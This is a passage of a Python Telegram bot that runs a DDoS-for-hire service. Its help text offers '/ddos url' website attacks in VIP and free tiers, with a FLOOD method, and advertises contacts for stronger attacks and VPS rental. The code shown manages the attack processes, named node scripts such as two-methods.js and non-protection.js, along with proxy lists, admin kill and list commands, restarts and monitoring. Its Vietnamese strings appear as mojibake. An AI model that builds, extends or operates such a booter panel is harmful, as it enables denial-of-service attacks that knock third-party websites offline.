            for i, proc in enumerate(chunk, 1 + index * MAX_PROCESSES_PER_MESSAGE):
                hours, remainder = divmod(proc['running_time'].seconds, 3600)
                minutes, seconds = divmod(remainder, 60)
                runtime = f"{hours}h {minutes}m {seconds}s"
                
                process_list.append(f'''<blockquote expandable>
â•‘ ğŸ“Œ Tiáº¿n trÃ¬nh {i}:
â•‘ â€¢ PID: <code>{proc['pid']}</code>
â•‘ â€¢ Target: <code>{proc['target']}</code>
â•‘ â€¢ Type: {proc['type']}
â•‘ â€¢ RAM: {proc['memory']} MB
â•‘ â€¢ Thá»i gian cháº¡y: {runtime}</blockquote>''')

            # Táº¡o tin nháº¯n cho pháº§n hiá»‡n táº¡i
            message = f'''<blockquote expandable>
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ ğŸ“Š DANH SÃCH TIáº¾N TRÃŒNH ({index + 1}/{len(chunks)})
â•‘ â€¢ Tá»•ng sá»‘: {len(node_processes)}{''.join(process_list)}
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•</blockquote>'''

            await update.message.reply_text(message, parse_mode='HTML')
            # Äá»£i má»™t chÃºt giá»¯a cÃ¡c tin nháº¯n Ä‘á»ƒ trÃ¡nh spam
            if index < len(chunks) - 1:
                await asyncio.sleep(0.5)

    except Exception as e:
        logger.error(f"Error in list_processes command: {e}")
        await update.message.reply_text(f'''<blockquote expandable>
âŒ Lá»—i khi láº¥y danh sÃ¡ch tiáº¿n trÃ¬nh
â€¢ {str(e)}</blockquote>''')

@restrict_room
async def kill_ddos(update: Update, context: CallbackContext):
    global bot_active
    user_id = update.message.from_user.id
    
    if user_id not in admins:
        return
        
    try:
        args = context.args
        specific_pid = None if not args else int(args[0])
        killed_processes = []
        
        # Danh sÃ¡ch cÃ¡c file cáº§n kiá»ƒm tra
        target_files = [
            'two-methods.js',
            'non-protection.js',
            'try-protection.js'
        ]
        
        if specific_pid:
            # Kill specific process
            try:
                process = psutil.Process(specific_pid)
                cmdline = ' '.join(process.cmdline())
                if process.name() == 'node' and any(file in cmdline for file in target_files):
                    process.kill()
                    killed_processes.append(specific_pid)
                else:
                    await update.message.reply_text(f'''
âŒ PID {specific_pid} KHÃ”NG Há»¢P Lá»†
â€¢ PID khÃ´ng pháº£i lÃ  tiáº¿n trÃ¬nh DDoS
â€¢ Sá»­ dá»¥ng /ls Ä‘á»ƒ xem danh sÃ¡ch PID
''')
                    return
            except psutil.NoSuchProcess:
                await update.message.reply_text(f'''
âŒ KHÃ”NG TÃŒM THáº¤Y PID {specific_pid}
â€¢ PID khÃ´ng tá»“n táº¡i
â€¢ Sá»­ dá»¥ng /lsd Ä‘á»ƒ xem danh sÃ¡ch PID
''')
                return
            except Exception as e:
                logger.error(f"Error killing specific process: {e}")
                await update.message.reply_text(f"âŒ Lá»—i khi kill PID {specific_pid}: {str(e)}")
                return
        else:
            # Kill all processes
            bot_active = False
            
            # Kill through psutil
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if proc.info['name'] == 'node':
                        cmdline = proc.info.get('cmdline', [])
                        if cmdline and any(file in ' '.join(cmdline) for file in target_files):
                            process = psutil.Process(proc.info['pid'])
                            process.kill()
                            killed_processes.append(proc.info['pid'])
                except Exception as e:
                    logger.error(f"Error killing process: {e}")
                    continue
            
            # Additional shell kill command for cleanup
            try:
                if os.name == 'nt':  # Windows
                    os.system('taskkill /F /IM node.exe')
                else:  # Linux/Unix
                    kill_commands = [
                        "pkill -9 -f 'node.*two-methods.js'",
                        "pkill -9 -f 'node.*non-protection.js'",
                        "pkill -9 -f 'node.*try-protection.js'"
                    ]
                    for cmd in kill_commands:
                        os.system(cmd)
            except Exception as e:
                logger.error(f"Error killing via shell: {e}")

        # Prepare response message
        if killed_processes:
            if specific_pid:
                message = f'''
âœ… KILL PID {specific_pid} THÃ€NH CÃ”NG
â€¢ Tiáº¿n trÃ¬nh Ä‘Ã£ dá»«ng
â€¢ Sá»­ dá»¥ng /lsd Ä‘á»ƒ xem danh sÃ¡ch cÃ²n láº¡i'''
            else:
                message = f'''
âœ… KILL ALL SUCCESS
â€¢ ÄÃ£ dá»«ng {len(killed_processes)} tiáº¿n trÃ¬nh
â€¢ PIDs: {', '.join(map(str, killed_processes))}
â€¢ Bot Ä‘Ã£ táº¯t
â€¢ Sá»­ dá»¥ng /ond Ä‘á»ƒ báº­t láº¡i'''
        else:
            message = '''
âŒ KHÃ”NG CÃ“ TIáº¾N TRÃŒNH ÄANG CHáº Y
â€¢ Bot Ä‘Ã£ táº¯t
â€¢ Sá»­ dá»¥ng /ond Ä‘á»ƒ báº­t láº¡i'''

        await update.message.reply_text(message)
            
    except ValueError:
        await update.message.reply_text('''
âŒ PID KHÃ”NG Há»¢P Lá»†
â–¶ Usage:
â€¢ /kill : Dá»«ng táº¥t cáº£ tiáº¿n trÃ¬nh
â€¢ /kill <pid> : Dá»«ng tiáº¿n trÃ¬nh cá»¥ thá»ƒ
â€¢ Sá»­ dá»¥ng /lsd Ä‘á»ƒ xem danh sÃ¡ch PID''')
    except Exception as e:
        logger.error(f"Error in kill_ddos: {e}")

def kill_all_processes():
    """Kill all running Node.js processes on startup"""
    try:
        logger.info("Killing all existing Node.js processes...")
        killed_count = 0
        
        # Danh sÃ¡ch cÃ¡c file cáº§n kiá»ƒm tra
        target_files = [
            'two-methods.js',
            'non-protection.js',
            'try-protection.js'
        ]
        
        # Kill qua psutil
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                if proc.info['name'] == 'node':
                    cmdline = proc.info.get('cmdline', [])
                    # Kiá»ƒm tra náº¿u cmdline chá»©a báº¥t ká»³ file nÃ o trong target_files
                    if cmdline and any(file in ' '.join(cmdline) for file in target_files):
                        process = psutil.Process(proc.info['pid'])
                        
                        # Kill cÃ¡c tiáº¿n trÃ¬nh con trÆ°á»›c
                        children = process.children(recursive=True)
                        for child in children:
                            child.kill()
                        psutil.wait_procs(children, timeout=3)
                        
                        # Kill tiáº¿n trÃ¬nh cha
                        process.kill()
                        killed_count += 1
                        
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
                logger.error(f"Error killing process via psutil: {e}")
                continue
                
        # Kill qua shell command Ä‘á»ƒ Ä‘áº£m báº£o
        try:
            if os.name == 'nt':  # Windows
                os.system('taskkill /F /IM node.exe')
            else:  # Linux/Unix
                # Kill cáº£ hai loáº¡i process
                kill_commands = [
                    "pkill -9 -f 'node.*two-methods.js'",
                    "pkill -9 -f 'node.*non-protection.js'",
                    "pkill -9 -f 'node.*try-protection.js'"
                ]
                for cmd in kill_commands:
                    os.system(cmd)
        except Exception as e:
            logger.error(f"Error killing processes via shell: {e}")
            
        # Clear attack processes dictionary
        attack_processes.clear()
        
        logger.info(f"Successfully killed {killed_count} Node.js processes")
        
    except Exception as e:
        logger.error(f"Error in kill_all_processes: {e}")


async def add_proxy(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    
    if user_id not in admins:
        return
    try:
        # Láº¥y ná»™i dung tin nháº¯n
        message_text = update.message.text
        
        # TÃ¡ch lá»‡nh vÃ  danh sÃ¡ch proxy
        lines = message_text.split('\n')
        if len(lines) < 2:
            await update.message.reply_text('''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ âŒ KHÃ”NG CÃ“ PROXY
â•‘ â€¢ Vui lÃ²ng nháº­p proxy theo Ä‘á»‹nh dáº¡ng
â•‘ â€¢ /addpx
â•‘ â€¢ ip:port
â•‘ â€¢ ip:port
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''')
            return
            
        # Lá»c bá» dÃ²ng lá»‡nh vÃ  láº¥y danh sÃ¡ch proxy
        proxies = lines[1:]
        
        # Kiá»ƒm tra Ä‘á»‹nh dáº¡ng proxy
        valid_proxies = []
        invalid_proxies = []
        
        for proxy in proxies:
            proxy = proxy.strip()
            if not proxy:  # Bá» qua dÃ²ng trá»‘ng
                continue
                
            # Kiá»ƒm tra Ä‘á»‹nh dáº¡ng ip:port
            try:
                ip, port = proxy.split(':')
                # Kiá»ƒm tra IP há»£p lá»‡
                ipaddress.ip_address(ip)
                # Kiá»ƒm tra port há»£p lï¿½ï¿½ï¿½
                port = int(port)
                if 1 <= port <= 65535:
                    valid_proxies.append(proxy)
                else:
                    invalid_proxies.append(proxy)
            except:
                invalid_proxies.append(proxy)
                
        if not valid_proxies:
            await update.message.reply_text('''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ âŒ KHÃ”NG CÃ“ PROXY Há»¢P Lá»†
â•‘ â€¢ Táº¥t cáº£ proxy khÃ´ng Ä‘Ãºng Ä‘á»‹nh dáº¡ng
â•‘ â€¢ Vui lÃ²ng kiá»ƒm tra láº¡i
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''')
            return
            
        # LÆ°u proxy vÃ o file
        proxy_path = './modules/proxy.txt'
        os.makedirs(os.path.dirname(proxy_path), exist_ok=True)
        
        # Ghi proxy má»›i vÃ o file, ghi Ä‘Ã¨ proxy cÅ©
        with open(proxy_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(valid_proxies))
            
        # Gá»­i thÃ´ng bÃ¡o káº¿t quáº£
        message = f'''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ âœ… Cáº¬P NHáº¬T PROXY THÃ€NH CÃ”NG
â•‘ â€¢ Tá»•ng sá»‘ proxy: {len(valid_proxies)}
â•‘ â€¢ Proxy há»£p lá»‡: {len(valid_proxies)}'''
        
        if invalid_proxies:
            message += f'''
â•‘ â€¢ Proxy khÃ´ng há»£p lá»‡: {len(invalid_proxies)}
â•‘ â€¢ Danh sÃ¡ch proxy lá»—i:
â•‘ {chr(10).join(f"â€¢ {proxy}" for proxy in invalid_proxies[:5])}'''
            if len(invalid_proxies) > 5:
                message += f'''
â•‘ â€¢ VÃ  {len(invalid_proxies) - 5} proxy khÃ¡c...'''
            
        message += '''
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•'''
        
        await update.message.reply_text(message)
        
    except Exception as e:
        logger.error(f"Error in add_proxy: {e}")
        await update.message.reply_text(f'''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ âŒ Lá»–I Cáº¬P NHáº¬T PROXY
â•‘ â€¢ {str(e)}
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''')
        
async def update_proxy_new(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    
    if user_id not in admins:
        return
    try:
        # Láº¥y ná»™i dung tin nháº¯n
        message_text = update.message.text
        
        # TÃ¡ch lá»‡nh vÃ  danh sÃ¡ch proxy
        lines = message_text.split('\n')
        if len(lines) < 2:
            await update.message.reply_text('''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ âŒ KHÃ”NG CÃ“ PROXY
â•‘ â€¢ Vui lÃ²ng nháº­p proxy theo Ä‘á»‹nh dáº¡ng
â•‘ â€¢ /uppx
â•‘ â€¢ ip:port
â•‘ â€¢ ip:port
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''')
            return
            
        # Lá»c bá» dÃ²ng lá»‡nh vÃ  láº¥y danh sÃ¡ch proxy
        proxies = lines[1:]
        
        # Kiá»ƒm tra Ä‘á»‹nh dáº¡ng proxy
        valid_proxies = []
        invalid_proxies = []
        
        for proxy in proxies:
            proxy = proxy.strip()
            if not proxy:  # Bá» qua dÃ²ng trá»‘ng
                continue
                
            # Kiá»ƒm tra Ä‘á»‹nh dáº¡ng ip:port
            try:
                ip, port = proxy.split(':')
                # Kiá»ƒm tra IP há»£p lá»‡
                ipaddress.ip_address(ip)
                # Kiá»ƒm tra port há»£p lá»‡
                port = int(port)
                if 1 <= port <= 65535:
                    valid_proxies.append(proxy)
                else:
                    invalid_proxies.append(proxy)
            except:
                invalid_proxies.append(proxy)
                
        if not valid_proxies:
            await update.message.reply_text('''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ âŒ KHÃ”NG CÃ“ PROXY Há»¢P Lá»†
â•‘ â€¢ Táº¥t cáº£ proxy khÃ´ng Ä‘Ãºng Ä‘á»‹nh dáº¡ng
â•‘ â€¢ Vui lÃ²ng kiá»ƒm tra láº¡i
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''')
            return
            
        # Äá»c proxy cÅ© tá»« file
        proxy_path = './modules/proxy.txt'
        os.makedirs(os.path.dirname(proxy_path), exist_ok=True)
        
        existing_proxies = []
        if os.path.exists(proxy_path):
            with open(proxy_path, 'r', encoding='utf-8') as f:
                existing_proxies = [line.strip() for line in f if line.strip()]
        
        # Loáº¡i bá» proxy trÃ¹ng láº·p tá»« danh sÃ¡ch má»›i
        new_valid_proxies = [p for p in valid_proxies if p not in existing_proxies]
        
        # Káº¿t há»£p proxy má»›i vÃ  cÅ©
        all_proxies = new_valid_proxies + existing_proxies
        
        # LÆ°u táº¥t cáº£ proxy vÃ o file
        with open(proxy_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(all_proxies))
            
        # Gá»­i thÃ´ng bÃ¡o káº¿t quáº£
        message = f'''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ âœ… Cáº¬P NHáº¬T PROXY THÃ€NH CÃ”NG
â•‘ â€¢ Proxy cÅ©: {len(existing_proxies)}
â•‘ â€¢ Proxy má»›i thÃªm: {len(new_valid_proxies)}
â•‘ â€¢ Tá»•ng sá»‘ proxy: {len(all_proxies)}'''
        
        if invalid_proxies:
            message += f'''
â•‘ â€¢ Proxy khÃ´ng há»£p lá»‡: {len(invalid_proxies)}
â•‘ â€¢ Danh sÃ¡ch proxy lá»—i:
â•‘ {chr(10).join(f"â€¢ {proxy}" for proxy in invalid_proxies[:5])}'''
            if len(invalid_proxies) > 5:
                message += f'''
â•‘ â€¢ VÃ  {len(invalid_proxies) - 5} proxy khÃ¡c...'''
            
        message += '''
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•'''
        
        await update.message.reply_text(message)
        
    except Exception as e:
        logger.error(f"Error in update_proxy: {e}")
        await update.message.reply_text(f'''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ âŒ Lá»–I Cáº¬P NHáº¬T PROXY
â•‘ â€¢ {str(e)}
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''')


@restrict_room
async def restart_bot(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    
    if user_id not in admins:
        return
        
    try:
        # Gá»­i thÃ´ng bÃ¡o Ä‘ang khá»Ÿi Ä‘á»™ng láº¡i vÃ  lÆ°u message
        status_message = await update.message.reply_text('''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ ğŸ”„ ÄANG KHá»I Äá»˜NG Láº I
â•‘ â€¢ Vui lÃ²ng Ä‘á»£i...
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''')
        
        # LÆ°u thÃ´ng tin khá»Ÿi Ä‘á»™ng láº¡i
        restart_info = {
            "chat_id": update.effective_chat.id,
            "message_id": status_message.message_id,
            "restart_time": time.time(),
            "action": "restart"
        }
        
        # Äáº£m báº£o thÆ° má»¥c tá»“n táº¡i
        os.makedirs('data', exist_ok=True)
        
        # LÆ°u thÃ´ng tin vÃ o file trong thÆ° má»¥c data
        with open("data/restart_info.json", "w") as f:
            json.dump(restart_info, f)
            
        logger.info(f"Saved restart info: {restart_info}")
        
        # Äá»£i 1 giÃ¢y Ä‘á»ƒ Ä‘áº£m báº£o file Ä‘Æ°á»£c lÆ°u
        await asyncio.sleep(1)
        
        # Dá»«ng táº¥t cáº£ cÃ¡c tiáº¿n trÃ¬nh ddos Ä‘ang cháº¡y
        await cleanup_attacks()
        
        logger.info("Bot is restarting...")
        
        # Khá»Ÿi Ä‘á»™ng láº¡i script
        os.execl(sys.executable, sys.executable, *sys.argv)
        
    except Exception as e:
        logger.error(f"Error in restart command: {e}")
        await update.message.reply_text(f'''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ âŒ Lá»–I KHá»I Äá»˜NG Láº I
â•‘ â€¢ {str(e)}
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''')

async def send_restart_notification(application: Application) -> None:
    """Send notification after bot restart"""
    try:
        # Thay Ä‘á»•i Ä‘Æ°á»ng dáº«n file
        if os.path.exists("data/restart_info.json"):
            with open("data/restart_info.json", "r") as f:
                restart_info = json.load(f)
            
            restart_duration = round(time.time() - restart_info["restart_time"], 2)
            chat_id = restart_info["chat_id"]
            message_id = restart_info["message_id"]
            action = restart_info.get("action", "restart")

            message = f'''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ âœ… KHá»I Äá»˜NG Láº I THÃ€NH CÃ”NG
â•‘ âš¡ï¸ Tá»•ng thá»i gian: {restart_duration}s
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•'''

            max_retries = 3
            retry_count = 0
            
            while retry_count < max_retries:
                try:
                    await application.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=message_id,
                        text=message
                    )
                    logger.info("Successfully sent restart notification")
                    break
                except (TimedOut, RetryAfter) as e:
                    retry_count += 1
                    if retry_count < max_retries:
                        await asyncio.sleep(2)
                    else:
                        logger.error(f"Failed to send restart notification after {max_retries} retries")
                except Exception as e:
                    logger.error(f"Error sending restart notification: {e}")
                    break
            
            try:
                os.remove("data/restart_info.json")
                logger.info("Removed restart info file")
            except Exception as e:
                logger.error(f"Error removing restart info file: {e}")
            
            # Äáº£m báº£o bot Ä‘Æ°á»£c báº­t
            global bot_active
            bot_active = True
            
    except Exception as e:
        logger.error(f"Error in send_restart_notification: {e}")

@restrict_room
async def start(update: Update, context: CallbackContext):
    message = '''<blockquote expandable>
<b>HÆ°á»›ng dáº«n /ddos</b>
ğŸ‘‰ <b>áº¤n xem cÃ¡ch DDOS...</b> ğŸ‘ˆ

â•‘ ğŸ“Œ VIP /muavipduocgi:
â•‘ â€¢ /ddos url - Táº¥n cÃ´ng website
â•‘ â€¢ /ddos method url - Chá»n methods
â•‘ â€¢ /methods - CÃ¡c phÆ°Æ¡ng thá»©c táº¥n cÃ´ng
â•‘ ğŸ’¡ PhÆ°Æ¡ng thá»©c máº·c Ä‘á»‹nh - FLOOD
â•‘
â•‘ ğŸ“Œ FREE /laykey:
â•‘ â€¢ /ddos url - Táº¥n cÃ´ng website
â•‘ â€¢ Máº·c Ä‘á»‹nh method lÃ  FLOOD
â•‘
â•‘ ADMIN:
â•‘ â€¢ /taskd - ... on - off
â•‘ â€¢ /kill - ...
â•‘ â€¢ /lsd - ...
â•‘ â€¢ /cpx - ...
â•‘ â€¢ /addpx - ...
â•‘ â€¢ /uppx - ...
â•‘ â€¢ /offd - ...
â•‘ â€¢ /ond - ...
â•‘ ğŸ’¡ Ddos máº¡nh hÆ¡n ib. @tranthanhpho
â•‘ ğŸ’¡ ThuÃª vps ib. @NeganSSHConsole
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•</blockquote>'''

    await update.message.reply_text(message, parse_mode='HTML')


onitoring_task = None
async def start_monitoring(application: Application):
   """Start monitoring task on bot startup"""
   global monitoring_task
   try:
       if not monitoring_task or monitoring_task.removed:
           monitoring_task = application.job_queue.run_repeating(
               send_monitoring_info,
               interval=15,  # 15 giÃ¢y gá»­i cÃ¡i
               first=1,
               name='system_monitoring'
           )
           logger.info("Monitoring task started automatically on startup")
   except Exception as e:
       logger.error(f"Error starting monitoring task: {e}")



def main():
    try:
        logger.info("Starting bot initialization...")
        kill_all_processes()
        logger.info("Building application...")
        application = Application.builder().token(TOKEN).build()
        
        logger.info("Adding command handlers...")
        # Add handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("ddos", ddos))
        application.add_handler(CommandHandler("killd", kill_ddos))
        application.add_handler(CommandHandler("addpx", add_proxy))
        application.add_handler(CommandHandler("uppx", update_proxy_new))
        application.add_handler(CallbackQueryHandler(handle_status_check, pattern="^st_"))
        application.add_handler(CommandHandler("offd", bot_off))
        application.add_handler(CommandHandler("ond", bot_on))
        application.add_handler(CommandHandler("taskd", task))
        application.add_handler(CommandHandler("lsd", list_processes))
        application.add_handler(CommandHandler("methods", methods))
        application.add_handler(CommandHandler("rsd", restart_bot))
        application.add_handler(CommandHandler("cpx", check_proxy_cron_status))
        logger.info("Setting up job queue...")
        job_queue = application.job_queue
        job_queue.run_repeating(
            callback=check_and_update_proxy,
            interval=1800,
            first=1,
            name='proxy_update'
        )
        
        logger.info("Adding error handler...")
        application.add_error_handler(error_handler)
        # Gá»­i thÃ´ng bÃ¡o khá»Ÿi Ä‘á»™ng náº¿u Ä‘Æ°á»£c (ko lá»—i)
        application.job_queue.run_once(
        lambda context: asyncio.create_task(send_restart_notification(application)),
        when=1  # Äá»£i 1 giÃ¢y sau khi khá»Ÿi Ä‘á»™ng
        )
        # ThÃªm proxy cron vÃ o startup tasks
        application.job_queue.run_once(
            lambda context: asyncio.create_task(start_proxy_cron(application)),
            when=3  # Cháº¡y sau 5 giÃ¢y Ä‘á»ƒ Ä‘áº£m báº£o bot Ä‘Ã£ khá»Ÿi Ä‘á»™ng hoÃ n toÃ n
        )
        application.job_queue.run_once(
           lambda context: asyncio.create_task(start_monitoring(application)),
           when=5  # Cháº¡y sau 5 giÃ¢y
       )
        logger.info("Setting up cleanup...")
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(cleanup_attacks())
        
        logger.info("Starting polling...")
        application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
        
    except Exception as e:
        logger.error(f"Error in main: {e}", exc_info=True)
        raise


if __name__ == '__main__':
    try:
        logger.info("Starting main program...")
        observer = Observer()
        handler = ReloadOnChangeHandler(lambda: os.execl(sys.executable, sys.executable, *sys.argv))
        observer.schedule(handler, path='.', recursive=False)
        
        logger.info("Starting file observer...")
        observer.start()
        
        logger.info("Calling main function...")
        main()
    except KeyboardInterrupt:
        logger.info("Received keyboard interrupt, stopping...")
        observer.stop()
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
    finally:
        logger.info("Joining observer thread...")
        observer.join()